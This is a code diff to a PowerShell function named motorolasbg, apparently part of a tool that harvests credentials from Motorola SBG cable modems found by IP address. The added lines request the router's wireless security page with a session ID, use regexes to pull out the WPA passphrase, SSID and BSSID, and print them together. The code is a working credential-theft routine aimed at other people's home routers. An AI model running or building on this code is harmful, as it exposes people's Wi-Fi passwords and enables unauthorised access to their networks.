@@ -167,6 +167,13 @@ function motorolasbg($ip){
     $sessionID = $Matches[0]
     curl -o $save --connect-timeout 3 -m 60 -s http://$ip/wireless/wirelessStatus.asp?sessionId=$sessionID -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=29805" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure
     verifyFile
+	
+	$sbg = Get-Content $save
+	$sbgPass = (curl "http://$ip/wireless/wirelessSecurity.asp?sessionId=23114" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" -H "DNT: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" -H "Referer: http://$ip/wireless/tabs.asp?sessionId=23114" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6" --compressed --insecure)
+	$PASS = ([Regex]::new('"Wireless.Security.wpaPskPassphrase",\s+".*"').Matches($sbgPass).value -split '",')[1].Trim().replace('"','')
+	$SSID = ([Regex]::new('"Wireless.Status.essid",\s+".*"').Matches($sbg).value -split '",')[1].Trim().replace('"','')
+	$BSSID = ($sbg -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('"')[1]
+	"$SSID - $BSSID - $PASS"
     }
 }
 
